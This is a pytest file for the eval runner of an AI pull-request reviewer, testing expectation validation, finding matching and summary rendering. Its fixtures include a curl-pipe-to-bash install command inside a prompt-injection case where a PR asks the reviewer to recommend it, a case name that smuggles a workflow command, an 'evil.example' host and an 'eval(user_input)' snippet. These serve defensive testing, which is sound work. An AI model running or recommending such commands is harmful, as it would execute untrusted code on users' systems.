"""evals.py: the eval runner. No network: a fake Anthropic client and in-memory
transports."""

import base64
import json
import shutil
from pathlib import Path
from types import SimpleNamespace

import pytest

from oc_review import analyze, collect, evals, publish

UNIT_FIX = Path(__file__).parent / "fixtures" / "analyze"
SMOKE = Path(__file__).parent / "fixtures" / "eval-smoke"
LIVE_FIXTURES = Path(__file__).resolve().parents[1] / "fixtures"
SCHEMA = Path(__file__).resolve().parents[2] / "schema" / "findings.schema.json"
JOB_SHA = "d" * 40
CONFIGURED = analyze.FederationIds(
    "fdrl_01AbCdEfGhIjKlMnOpQrStUv", "2bc920f9-1111-4222-8333-444455556666", "svac_01AbCdEfGhIjKlMnOpQrStUv"
)


PLACEHOLDERS = analyze.FederationIds(
    "fdrl_000000000000000000000000", "00000000-0000-0000-0000-000000000000", "svac_000000000000000000000000"
)


FAKE_EXPECTED = {"gate": "fail", "findings": [{"category": "security", "severity": "high"}]}


def _b64(doc):
    return base64.urlsafe_b64encode(json.dumps(doc).encode()).rstrip(b"=").decode()


GOOD_JWT = (
    f"{_b64({'alg': 'RS256', 'typ': 'JWT'})}."
    f"{_b64({'aud': analyze.OIDC_AUDIENCE, 'job_workflow_sha': JOB_SHA, 'sub': 'repo:OperationCode@1/x'})}.c2ln"
)


class FakeStream:
    def __init__(self, text):
        self.text = text

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False

    def __iter__(self):
        yield SimpleNamespace(type="stream_event")

    def get_final_message(self):
        usage = SimpleNamespace(input_tokens=100, output_tokens=20, cache_creation_input_tokens=0,
                                cache_read_input_tokens=0, iterations=None)
        return SimpleNamespace(model="claude-opus-5-5", stop_reason="end_turn", usage=usage,
                               content=[SimpleNamespace(type="text", text=self.text)])


class FakeClient:
    def __init__(self, findings=None):
        doc = json.loads((UNIT_FIX / "findings.json").read_text())
        if findings is not None:
            doc = {"summary": doc["summary"], "findings": findings}
        self.text = json.dumps(doc)
        self.calls = 0
        self.beta = SimpleNamespace(messages=SimpleNamespace(stream=self.stream))

    def stream(self, **kwargs):
        self.calls += 1
        return FakeStream(self.text)


def oidc(url, request_token):
    return 200, json.dumps({"value": GOOD_JWT}).encode()


def factory_for(client, seen=None):
    def factory(token_file, *, deadline, clock, federation):
        if seen is not None:
            seen.append(federation)
        return client

    return factory


def make_case(root, name="case1", expected=None):
    d = root / name
    d.mkdir(parents=True)
    shutil.copy(SMOKE / "bundle.json", d / "bundle.json")
    # the fake client returns a high security finding, so the default case expects it
    expected = FAKE_EXPECTED if expected is None else expected
    (d / "expected.json").write_text(json.dumps(expected))
    return d


def run(tmp_path, client, *, federation=CONFIGURED, seen=None, oidc_calls=None):
    def oidc_transport(url, request_token):
        if oidc_calls is not None:
            oidc_calls.append(url)
        return oidc(url, request_token)

    env = {"JOB_WORKFLOW_SHA": JOB_SHA, "RUNNER_TEMP": str(tmp_path / "rt"),
           "ACTIONS_ID_TOKEN_REQUEST_URL": "https://pipelines.actions.githubusercontent.com/oidc?api-version=2.0",
           "ACTIONS_ID_TOKEN_REQUEST_TOKEN": "t"}
    (tmp_path / "rt").mkdir(exist_ok=True)
    return evals.main(
        ["--fixtures-dir", str(tmp_path / "fixtures"), "--out-dir", str(tmp_path / "out")],
        environ=env, oidc_transport=oidc_transport, client_factory=factory_for(client, seen), federation=federation,
        sleep=lambda s: None,
    )


def result_lines(tmp_path):
    return [json.loads(x) for x in (tmp_path / "out" / "results.jsonl").read_text().splitlines()]


def test_matching_case_exits_zero(tmp_path, capsys):
    make_case(tmp_path / "fixtures")
    client, seen = FakeClient(), []
    assert run(tmp_path, client, seen=seen) == 0
    [r] = result_lines(tmp_path)
    assert r["matched"] and r["mismatches"] == [] and client.calls == 3
    assert seen == [CONFIGURED] * 1
    assert r["usage"]["input_tokens"] == 300 and r["usage"]["output_tokens"] == 60
    assert json.loads(capsys.readouterr().out.splitlines()[0]) == r


def test_mismatch_exits_one(tmp_path):
    make_case(tmp_path / "fixtures", expected={"gate": "pass"})
    assert run(tmp_path, FakeClient()) == 1
    [r] = result_lines(tmp_path)
    assert not r["matched"] and any(m.startswith("gate:") for m in r["mismatches"])


def test_missing_finding_is_a_mismatch(tmp_path):
    make_case(tmp_path / "fixtures", expected={"gate": "fail", "findings": [{"category": "bug", "severity": "low"}]})
    assert run(tmp_path, FakeClient()) == 1
    assert "missing finding bug/low+" in result_lines(tmp_path)[0]["mismatches"]


def test_hard_block_codes_are_compared(tmp_path):
    make_case(tmp_path / "fixtures", expected={"gate": "fail", "hard_blocks": ["bidi-control"]})
    assert run(tmp_path, FakeClient()) == 1
    assert any(m.startswith("hard blocks:") for m in result_lines(tmp_path)[0]["mismatches"])


def test_zero_cases_exits_one(tmp_path):
    (tmp_path / "fixtures").mkdir()
    assert run(tmp_path, FakeClient()) == 1


def test_missing_fixtures_dir_exits_one(tmp_path):
    assert run(tmp_path, FakeClient()) == 1


def test_placeholders_make_no_call(tmp_path):
    make_case(tmp_path / "fixtures")
    client = FakeClient()
    assert run(tmp_path, client, federation=PLACEHOLDERS) == 1
    [r] = result_lines(tmp_path)
    assert client.calls == 0
    assert {p["reason"] for p in r["passes"].values()} == {"federation not configured"}
    assert any("federation not configured" in m for m in r["mismatches"])


def test_eval_ids_are_the_real_eval_rule():
    ids = evals.eval_federation()
    assert ids == analyze.FederationIds(
        "fdrl_01BL4n1gQzkrroCmDZoXUePm", "2bc920f9-977b-43b2-870a-f840e4ce809c", "svac_017eR3ohB6rP5MEAsda6U7X6"
    )
    assert analyze.ids_valid(ids) and not analyze.ids_are_placeholders(ids)


TEST_RULE_ID = "fdrl_01DrmQ8SP1yTeAi8icEtQbUD"
SIMULATION_RULE_ID = "fdrl_01AfACzupW3U4Bx361ZUbsyR"
TEST_SERVICE_ACCOUNT_ID = "svac_017eR3ohB6rP5MEAsda6U7X6"


def test_production_ids_are_the_real_production_rule():
    assert analyze.federation_ids() == analyze.FederationIds(
        SIMULATION_RULE_ID, "2bc920f9-977b-43b2-870a-f840e4ce809c", TEST_SERVICE_ACCOUNT_ID
    )  # SIMULATION ONLY: S2 names R2 and the test service account


def test_eval_ids_differ_from_production_ids():
    ids, prod = evals.eval_federation(), analyze.federation_ids()
    assert analyze.ids_valid(prod) and not analyze.ids_are_placeholders(prod)
    assert ids.rule_id != prod.rule_id
    # SIMULATION ONLY: S2 uses the test service account, so only the rule differs
    # one organization, so the workspace and service account separate the rules
    assert ids.organization_id == prod.organization_id


def test_production_ids_differ_from_every_test_id():
    prod = analyze.federation_ids()
    # SIMULATION ONLY: S2 production IDs are the simulation rule and the test service account
    assert prod.rule_id not in {evals.eval_federation().rule_id, TEST_RULE_ID}


def test_main_uses_the_eval_ids_by_default(tmp_path):
    make_case(tmp_path / "fixtures")
    seen = []
    env = {"JOB_WORKFLOW_SHA": JOB_SHA, "RUNNER_TEMP": str(tmp_path),
           "ACTIONS_ID_TOKEN_REQUEST_URL": "https://pipelines.actions.githubusercontent.com/oidc?api-version=2.0",
           "ACTIONS_ID_TOKEN_REQUEST_TOKEN": "t"}
    evals.main(["--fixtures-dir", str(tmp_path / "fixtures"), "--out-dir", str(tmp_path / "out")], environ=env,
               oidc_transport=oidc, client_factory=factory_for(FakeClient(), seen), sleep=lambda s: None)
    assert seen == [evals.eval_federation()]


def test_failed_pass_is_not_a_match(tmp_path):
    make_case(tmp_path / "fixtures")
    client = FakeClient()
    client.text = "not json"
    assert run(tmp_path, client) == 1
    assert not result_lines(tmp_path)[0]["matched"]


def test_bad_case_fails_and_others_run(tmp_path):
    fx = tmp_path / "fixtures"
    make_case(fx, "a-bad")
    (fx / "a-bad" / "expected.json").write_text("{")
    make_case(fx, "b-good")
    assert run(tmp_path, FakeClient()) == 1
    bad, good = result_lines(tmp_path)
    assert not bad["matched"] and good["matched"]


def test_output_has_no_currency(tmp_path):
    make_case(tmp_path / "fixtures")
    run(tmp_path, FakeClient())
    text = (tmp_path / "out" / "results.jsonl").read_text()
    assert "$" not in text and "usd" not in text.lower() and "cost" not in text.lower()


def test_pr_transport_allows_only_the_one_pr():
    bundle = json.loads((SMOKE / "bundle.json").read_text())
    t = evals.pr_transport(bundle)
    url = f"https://api.github.com/repos/{evals.EVAL_REPOSITORY}/pulls/{bundle['pr_number']}"
    ok = t(collect.HttpRequest("GET", url, {}, 1000, 1.0))
    assert ok.status == 200 and json.loads(ok.body)["head"]["sha"] == bundle["head_sha"]
    for bad in (url + "/files", "https://example.com/x", url.replace("api.github.com", "evil.example")):
        with pytest.raises(AssertionError):
            t(collect.HttpRequest("GET", bad, {}, 1000, 1.0))
    with pytest.raises(AssertionError):
        t(collect.HttpRequest("POST", url, {}, 1000, 1.0))


def test_smoke_fixture_is_not_in_the_live_fixtures():
    # ruling Q4: a live run pays for every case in review/tests/fixtures
    assert SMOKE.is_dir() and not (LIVE_FIXTURES / "eval-smoke").exists()


def test_smoke_fixture_expects_only_what_is_deterministic():
    # the live model decides findings and the gate; only code decides hard blocks
    expected = json.loads((SMOKE / "expected.json").read_text())
    assert set(expected) <= {"hard_blocks"} and expected.get("hard_blocks", []) == []


def test_smoke_fixture_matches_any_valid_output(tmp_path):
    fx = tmp_path / "fixtures"
    d = make_case(fx)
    shutil.copy(SMOKE / "expected.json", d / "expected.json")
    assert run(tmp_path, FakeClient(findings=[])) == 0
    assert result_lines(tmp_path)[0]["matched"]


def test_matching_hard_blocks_pass(tmp_path):
    d = make_case(tmp_path / "fixtures", expected={"hard_blocks": ["bidi-control-characters"]})
    bundle = json.loads((d / "bundle.json").read_text())
    bundle["payload"]["prefilter"]["hard_blocks"] = [{
        "id": "bidi-control-characters", "level": "hard_block", "detail": "bidi control characters",
        "file": "src/a.js", "subject": None, "lines": [3], "count": 1,
    }]
    (d / "bundle.json").write_text(json.dumps(bundle))
    assert run(tmp_path, FakeClient()) == 0
    [r] = result_lines(tmp_path)
    assert r["matched"] and r["gate"] == "fail"


def test_bad_gate_value_is_a_failed_case(tmp_path):
    make_case(tmp_path / "fixtures", expected={"gate": "maybe"})
    assert run(tmp_path, FakeClient()) == 1
    [r] = result_lines(tmp_path)
    assert not r["matched"] and "gate must be pass or fail" in r["mismatches"][0]


@pytest.mark.parametrize("expected", [
    {"finding": [{"category": "security", "severity": "high"}]},
    {"findings": "security"},
    {"hard_blocks": [1]},
    {"gate": "pass", "evil\nkey": 1},
    {"findings": [{"category": "security"}]},
    {"findings": ["oops"]},
    {"findings": [{"category": "security", "severity": "high", "line": 3}]},
    {"findings": [{"category": "sql", "severity": "high"}]},
    {"findings": [{"category": [], "severity": "high"}]},
    {"findings": [{"category": ["security", 1], "severity": "high"}]},
    {"findings": [{"category": "security", "severity": "High"}]},
    {"findings": [{"category": "security", "severity": "high", "side": "left"}]},
    {"findings": [{"category": "security", "severity": "high", "verified": "yes"}]},
    {"findings": [{"category": "security", "severity": "high", "file": ""}]},
    {"max_severity": "none"},
    {"max_severity": 2},
    {"summary_excludes": "secret"},
    {"summary_excludes": [""]},
])
def test_invalid_expectation_is_a_failed_case_before_any_call(tmp_path, expected):
    make_case(tmp_path / "fixtures", expected=expected)
    seen = []
    assert run(tmp_path, FakeClient(), seen=seen) == 1
    [r] = result_lines(tmp_path)
    assert not r["matched"] and r["mismatches"][0].startswith("EvalError: expected.json:")
    assert seen == []


def calls_for_one_good_case(tmp_path):
    make_case(tmp_path / "fixtures", "b-good")
    client, seen, oidc_calls = FakeClient(), [], []
    assert run(tmp_path, client, seen=seen, oidc_calls=oidc_calls) == 0
    return oidc_calls, seen, client.calls


def assert_bad_case_makes_no_call(tmp_path, raw, error):
    """A bad `expected.json` fails its case before OIDC, client or model
    calls, and a valid later case still runs."""
    baseline = calls_for_one_good_case(tmp_path / "baseline")
    fx = tmp_path / "fixtures"
    make_case(fx, "a-bad")
    (fx / "a-bad" / "expected.json").write_text(raw)
    make_case(fx, "b-good")
    client, seen, oidc_calls = FakeClient(), [], []
    assert run(tmp_path, client, seen=seen, oidc_calls=oidc_calls) == 1
    bad, good = result_lines(tmp_path)
    assert not bad["matched"] and bad["mismatches"] == [error]
    assert good["matched"]
    assert (oidc_calls, seen, client.calls) == baseline


# Each of these matched with no mismatch when json.loads kept the last value.
@pytest.mark.parametrize("raw, key", [
    ('{"findings": [{"category": "bug", "severity": "critical"}], "findings": []}', "findings"),
    ('{"max_severity": "low", "max_severity": "critical"}', "max_severity"),
    ('{"findings": "wrong type", "findings": []}', "findings"),
    ('{"findings": [{"category": "bug", "category": "security", "severity": "high"}]}', "category"),
    ('{"gate": "fail", "summary_excludes": ["x"], "summary_excludes": []}', "summary_excludes"),
])
def test_duplicate_key_in_expectation_fails_before_any_call(tmp_path, raw, key):
    assert_bad_case_makes_no_call(tmp_path, raw, f"EvalError: expected.json: ValueError: duplicate key {key!r}")


def test_null_gate_fails_before_any_call(tmp_path):
    # null is a wrong type, not an absent key: absent means "do not check"
    assert_bad_case_makes_no_call(tmp_path, '{"gate": null}', "EvalError: expected.json: gate must be pass or fail")


@pytest.mark.parametrize("hard_blocks", [["bidi-control", "bidi-control"], [""]])
def test_hard_blocks_that_can_never_match_fail_before_any_call(tmp_path, hard_blocks):
    assert_bad_case_makes_no_call(tmp_path, json.dumps({"hard_blocks": hard_blocks}),
                                  "EvalError: expected.json: hard_blocks must be a list of distinct check IDs")


def test_absent_gate_is_not_checked(tmp_path):
    make_case(tmp_path / "fixtures", expected={"findings": [{"category": "security", "severity": "high"}]})
    assert run(tmp_path, FakeClient()) == 0


def test_results_are_written_per_case(tmp_path, monkeypatch):
    fx = tmp_path / "fixtures"
    make_case(fx, "a-good")
    make_case(fx, "b-good")

    real = evals.run_case
    calls = []

    def crash_on_second(*args, **kwargs):
        calls.append(1)
        if len(calls) == 2:
            raise KeyboardInterrupt  # not an Exception: main does not catch it
        return real(*args, **kwargs)

    monkeypatch.setattr(evals, "run_case", crash_on_second)
    with pytest.raises(KeyboardInterrupt):
        run(tmp_path, FakeClient())
    assert [r["case"] for r in result_lines(tmp_path)] == ["a-good"]


def test_stdout_is_one_line_per_case_for_a_hostile_case_name(tmp_path, capsys):
    make_case(tmp_path / "fixtures", "a\n::add-mask::x", expected={"gate": "maybe"})
    run(tmp_path, FakeClient())
    out = capsys.readouterr().out
    assert len(out.splitlines()) == 1 and not out.startswith("::")


# ------------------------------------------------------- expectation format v2

APP_FILE = {
    "path": "src/app.py", "status": "modified",
    "base_content": "a\nif not is_admin(user): raise Denied\nb\n",
    "head_content": "a\nb\neval(user_input)\n",
}


def finding(**over):
    base = {"category": "security", "severity": "high", "confidence": "high", "file": "src/app.py", "side": "head",
            "line": 3, "quote": "eval(user_input)", "title": "eval on input", "explanation": "User input reaches eval."}
    return {**base, **over}


HEAD_HIGH = finding()  # verified, on an added head line (inline)
BASE_HIGH = finding(side="base", line=2, quote="if not is_admin(user): raise Denied", title="authz removed")
UNVERIFIED_HIGH = finding(quote="not in the file", title="made up")


def run_with_file(tmp_path, expected, findings):
    d = make_case(tmp_path / "fixtures", expected=expected)
    bundle = json.loads((d / "bundle.json").read_text())
    bundle["payload"]["files"] = [APP_FILE]
    (d / "bundle.json").write_text(json.dumps(bundle))
    code = run(tmp_path, FakeClient(findings=findings))
    [r] = result_lines(tmp_path)
    assert (code == 0) == r["matched"]
    return r


def test_schema_enums_match_the_runner():
    props = json.loads(SCHEMA.read_text())["properties"]["findings"]["items"]["properties"]
    assert list(evals.CATEGORIES) == props["category"]["enum"]
    assert list(evals.SEVERITIES) == props["severity"]["enum"]
    assert list(evals.SIDES) == sorted(props["side"]["enum"], reverse=True)


@pytest.mark.parametrize("want", ["low", "medium", "high"])
def test_severity_at_or_above_matches(tmp_path, want):
    r = run_with_file(tmp_path, {"findings": [{"category": "security", "severity": want}]}, [HEAD_HIGH])
    assert r["matched"]


def test_severity_below_expected_is_a_miss(tmp_path):
    r = run_with_file(tmp_path, {"findings": [{"category": "security", "severity": "critical"}]}, [HEAD_HIGH])
    assert r["mismatches"] == ["missing finding security/critical+"]


def test_severity_category_list_matches_any(tmp_path):
    expected = {"findings": [{"category": ["supply-chain", "security"], "severity": "high"}]}
    assert run_with_file(tmp_path, expected, [HEAD_HIGH])["matched"]


def test_severity_category_list_miss(tmp_path):
    expected = {"findings": [{"category": ["supply-chain", "malicious"], "severity": "low"}]}
    r = run_with_file(tmp_path, expected, [HEAD_HIGH])
    assert r["mismatches"] == ["missing finding supply-chain|malicious/low+"]


def test_verified_true_matches_a_verified_finding(tmp_path):
    expected = {"findings": [{"category": "security", "severity": "high", "verified": True}]}
    r = run_with_file(tmp_path, expected, [HEAD_HIGH])
    assert r["matched"] and r["findings"][0]["verified"] is True


def test_verified_true_misses_an_unverified_finding(tmp_path):
    expected = {"findings": [{"category": "security", "severity": "high", "verified": True}]}
    r = run_with_file(tmp_path, expected, [UNVERIFIED_HIGH])
    assert r["mismatches"] == ["missing finding security/high+ verified=true"]


def test_verified_false_matches_only_an_unverified_finding(tmp_path):
    expected = {"findings": [{"category": "security", "severity": "high", "verified": False}]}
    assert run_with_file(tmp_path, expected, [UNVERIFIED_HIGH])["matched"]
    assert not run_with_file(tmp_path / "2", expected, [HEAD_HIGH])["matched"]


def test_side_base_matches_a_base_citation(tmp_path):
    expected = {"findings": [{"category": "security", "severity": "high", "side": "base", "verified": True}]}
    r = run_with_file(tmp_path, expected, [BASE_HIGH])
    assert r["matched"] and r["findings"][0]["side"] == "base"


def test_side_base_misses_a_head_citation(tmp_path):
    expected = {"findings": [{"category": "security", "severity": "high", "side": "base"}]}
    r = run_with_file(tmp_path, expected, [HEAD_HIGH])
    assert r["mismatches"] == ['missing finding security/high+ side="base"']


def test_side_and_file_match_exactly(tmp_path):
    expected = {"findings": [{"category": "security", "severity": "low", "file": "src/app.py", "side": "head"}]}
    assert run_with_file(tmp_path, expected, [HEAD_HIGH])["matched"]
    expected["findings"][0]["file"] = "src/other.py"
    r = run_with_file(tmp_path / "2", expected, [HEAD_HIGH])
    assert r["mismatches"] == ['missing finding security/low+ file="src/other.py" side="head"']


def test_side_every_expected_finding_must_be_present(tmp_path):
    expected = {"findings": [{"category": "security", "severity": "high", "side": "head"},
                             {"category": "security", "severity": "high", "side": "base"}]}
    assert run_with_file(tmp_path, expected, [HEAD_HIGH, BASE_HIGH])["matched"]
    assert not run_with_file(tmp_path / "2", expected, [HEAD_HIGH])["matched"]


@pytest.mark.parametrize("limit", ["high", "critical"])
def test_max_severity_at_or_below_limit_matches(tmp_path, limit):
    assert run_with_file(tmp_path, {"max_severity": limit}, [HEAD_HIGH])["matched"]


def test_max_severity_no_findings_matches(tmp_path):
    assert run_with_file(tmp_path, {"gate": "pass", "max_severity": "low"}, [])["matched"]


def test_max_severity_above_limit_is_a_miss(tmp_path):
    r = run_with_file(tmp_path, {"max_severity": "medium"}, [finding(severity="low"), HEAD_HIGH])
    # the fake client returns the same findings in each of the three passes
    assert r["mismatches"] == [f"finding above max_severity medium: security/high ({p}, verified)"
                               for p in analyze.PASS_NAMES]


def test_max_severity_counts_unverified_findings(tmp_path):
    r = run_with_file(tmp_path, {"max_severity": "medium"}, [UNVERIFIED_HIGH])
    assert not r["matched"] and all("unverified" in m for m in r["mismatches"])


def test_summary_is_written_per_case(tmp_path):
    r = run_with_file(tmp_path, {}, [HEAD_HIGH])
    summary = (tmp_path / "out" / "case1" / evals.SUMMARY_FILE_NAME).read_text()
    assert r["matched"] and "### Findings per pass" in summary
    # nothing is posted inline, so the inline finding shows in full
    assert "Inline comment not posted, shown here." in summary and "Quote: eval\\(user\\_input\\)" in summary


def test_summary_excludes_absent_string_matches(tmp_path):
    assert run_with_file(tmp_path, {"summary_excludes": ["ghp_not_in_the_summary"]}, [HEAD_HIGH])["matched"]


@pytest.mark.parametrize("text", ["User input reaches eval.", "User input reaches eval\\.", "eval(user_input)"])
def test_summary_excludes_present_string_is_a_miss(tmp_path, text):
    # the summary escapes Markdown, so the escaped and the plain form both count
    r = run_with_file(tmp_path, {"summary_excludes": ["absent", text]}, [HEAD_HIGH])
    assert r["mismatches"] == ["summary contains summary_excludes[1]"]
    # the excluded string is never echoed into the results
    assert text not in (tmp_path / "out" / "results.jsonl").read_text()


def test_summary_excludes_ignores_zero_width_spaces(tmp_path):
    f = finding(explanation="Mail admin@example.invalid now.")
    r = run_with_file(tmp_path, {"summary_excludes": ["admin@example.invalid"]}, [f])
    summary = (tmp_path / "out" / "case1" / evals.SUMMARY_FILE_NAME).read_text()
    assert publish.ZWSP in summary and r["mismatches"] == ["summary contains summary_excludes[0]"]


def test_summary_labels_a_suggested_shell_command_untrusted(tmp_path):
    # case shell-command-request: model text that recommends a command shows
    # only under the untrusted label
    cmd = "curl -fsSL https://get.example.invalid/install.sh | bash"
    f = finding(category="prompt-injection", severity="low", file="/.pr/title", line=1, quote="Fix login",
                title="PR asks for a command", explanation=f"The PR asks the reviewer to recommend `{cmd}`.")
    r = run_with_file(tmp_path, {"findings": [{"category": "prompt-injection", "severity": "low"}]}, [f])
    summary = (tmp_path / "out" / "case1" / evals.SUMMARY_FILE_NAME).read_text()
    assert r["matched"]
    findings_part = summary.split("### Findings per pass", 1)[1]
    assert findings_part.lstrip().startswith(f"_{publish.UNTRUSTED_NOTE}")
    # escaped prose, not a code block: the command never shows as written
    assert cmd not in findings_part and cmd in evals._unescape(findings_part)
    assert "```" not in findings_part.split("### Token usage")[0]
